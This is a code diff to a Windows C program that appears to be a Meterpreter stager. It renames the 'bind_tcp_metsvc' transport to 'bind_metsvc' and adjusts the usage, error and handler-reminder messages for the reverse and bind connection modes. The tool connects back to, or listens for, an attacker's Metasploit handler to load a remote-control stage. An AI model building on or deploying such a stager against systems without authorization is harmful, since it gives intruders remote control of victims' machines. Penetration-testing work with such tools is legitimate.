@@ -95,14 +95,15 @@ int wmain(int argc, wchar_t *argv[])
 				}
 
 				/* metsvc_bind_tcp */
-				else if (wcscmp(payload_settings.TRANSPORT,L"BIND_TCP_METSVC") == 0)
+				else if (wcscmp(payload_settings.TRANSPORT,L"BIND_METSVC") == 0)
 				{
 					payload_settings.TRANSPORT = L"METERPRETER_BIND_TCP";
 					metsvc = true;
 				}
 
 				else {
-					dprintf(L"[-] Unknown transport: \"%s\"\n[-] Valid transports are reverse_tcp, reverse_metsvc, reverse_http,\n    reverse_https, bind_tcp and bind_tcp_metsvc.\n", payload_settings.TRANSPORT);
+					dprintf(L"[-] Unknown transport: \"%s\"\n[-] Valid transports are reverse_tcp, reverse_metsvc, reverse_http,", payload_settings.TRANSPORT);
+					dprintf(L"\n    reverse_https, bind_tcp and bind_metsvc.\n");  
 					exit(0);
 				}
 				// End of Transport checks
@@ -150,16 +151,16 @@ int wmain(int argc, wchar_t *argv[])
 			{
 				dprintf(L"\n[-] Unable to load stage from resource, and \"-f\" not specified ... yet you've chosen %s!\n",payload_settings.TRANSPORT);
 				dprintf(L"    sorry sweetheart, that's not going to work, metsvc *requires* that the stage is available upfront.\n");
-				dprintf(L"[-] Use inmet.exe, use \"reverse_tcp\", use another transport, or bundle this exe with metsvc.dll.\n"
-					L" -  To bundle the stage into this exe: import metsrv.dll as a resource, call it \"BINARY\" and ID it \"101\".\n"
-					L" -  You can also load the stage from file system by using \"-f\" switch.\n");
+				dprintf(L"[-] Use inmet.exe, use \"reverse_tcp\" or \"bind_tcp\", use another transport, or bundle this exe with metsvc.dll.\n"
+						L" -  To bundle the stage into this exe: import metsrv.dll as a resource, call it \"BINARY\" and ID it \"101\".\n"
+						L" -  You can also load the stage from file system by using \"-f\" switch.\n");
 				dprintf(L"[-] ... will exit.\n");
 				exit(1);
 			} else
 			{
 				dprintf(L"[!] Couldn't read stage from resource & \"-f\" not speified; falling back to \"stager\" mode...\n"
-					L" -  To bundle the stage into this exe: import metsrv.dll as a resource, call it \"BINARY\" and ID it \"101\".\n"
-					L" -  You can also load the stage from file system by using \"-f\" switch.\n");
+						L" -  To bundle the stage into this exe: import metsrv.dll as a resource, call it \"BINARY\" and ID it \"101\".\n"
+						L" -  You can also load the stage from file system by using \"-f\" switch.\n");
 			}
 		}
 	}
@@ -208,7 +209,7 @@ int wmain(int argc, wchar_t *argv[])
 			StagerRevereTCP(payload_settings.LHOST,payload_settings.LPORT);
 		} 
 
-		/* bind_tcp and bind_tcp_metsvc */
+		/* bind_tcp and bind_metsvc */
 		else if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_BIND_TCP") == 0)
 		{
 			StagerBindTCP(payload_settings.LHOST,payload_settings.LPORT);
@@ -335,8 +336,8 @@ int wmain(int argc, wchar_t *argv[])
 				// However, The customer is always right, right? let's connect them to their beloved reverse_tcp in stager mode nevertheless.
 				// ... but we have to tell them what they've done wrong.
 				dprintf(L"\n[!] We already have the stage, why did you chose reverse_tcp? you could've picked reverse_metsvc.\n" 
-					L"    next time use \"-t reverse_metsvc\" -> \"exploit/multi/handler/windows/metsvc_reverse_tcp\".\n"
-					L" -  anyway, will assume you know what you're doing and connect to reverse_tcp in *stager* mode...\n\n");
+						L"    next time use \"-t reverse_metsvc\" -> \"exploit/multi/handler/windows/metsvc_reverse_tcp\".\n"
+						L" -  anyway, will assume you know what you're doing and connect to reverse_tcp in *stager* mode...\n\n");
 					
 				dprintf(L"[*] Make sure you have \"windows/meterpreter/reverse_tcp\" handler running.\n\n");
 				
@@ -355,7 +356,7 @@ int wmain(int argc, wchar_t *argv[])
 			buffer = TempBuffer;							//Got it? I'm sure there's a better way to do that, but I'm not smart enough to figure out how yet :).
 			//////////////////////////////////////////////////
 
-			dprintf(L"\n[*] Make sure you have \"windows/metsvc_reverse_tcp\" handler running.\n\n");
+			if (metsvc) dprintf(L"\n[*] Make sure you have \"windows/metsvc_reverse_tcp\" handler running.\n\n");
 			ConnectSocket = get_socket(payload_settings.LHOST,payload_settings.LPORT);
 			if (ConnectSocket == INVALID_SOCKET)
 			{
@@ -435,11 +436,11 @@ int wmain(int argc, wchar_t *argv[])
 		{
 			if(!metsvc)
 			{
-				dprintf(L"\n[!] We already have the stage, why did you chose bind_tcp? you could've picked bind_tcp_metsvc.\n" 
-					L"    next time use \"-t bind_tcp_metsvc\" -> \"exploit/multi/handler/windows/metsvc_bind_tcp\".\n"
-					L" -  anyway, will assume you know what you're doing and connect to bind_tcp in *stager* mode...\n\n");
+				dprintf(L"\n[!] We already have the stage, why did you chose bind_tcp? you could've picked bind_metsvc.\n" 
+						L"    next time use \"-t bind_metsvc\" -> \"exploit/multi/handler/windows/metsvc_bind_tcp\".\n"
+						L" -  anyway, will assume you know what you're doing and connect to bind_tcp in *stager* mode...\n\n");
 					
-				dprintf(L"[*] Make sure you have \"windows/metsvc_bind_tcp\" handler running.\n\n");
+				dprintf(L"[*] Make sure you have \"windows/meterpreter_bind_tcp\" handler running.\n\n");
 
 				StagerBindTCP(payload_settings.LHOST,payload_settings.LPORT);
 			} 
@@ -448,7 +449,7 @@ int wmain(int argc, wchar_t *argv[])
 			memcpy(TempBuffer + 5, buffer, StageSize);
 			buffer = TempBuffer;
 
-			//dprintf(L"\n[*] Make sure you have \"windows/metsvc_bind_tcp\" handler running.\n\n");
+			if (metsvc) dprintf(L"\n[*] Make sure you have \"windows/metsvc_bind_tcp\" handler running.\n\n");
 			ConnectSocket = get_server_socket(payload_settings.LHOST,payload_settings.LPORT);
 			if (ConnectSocket == INVALID_SOCKET)
 			{
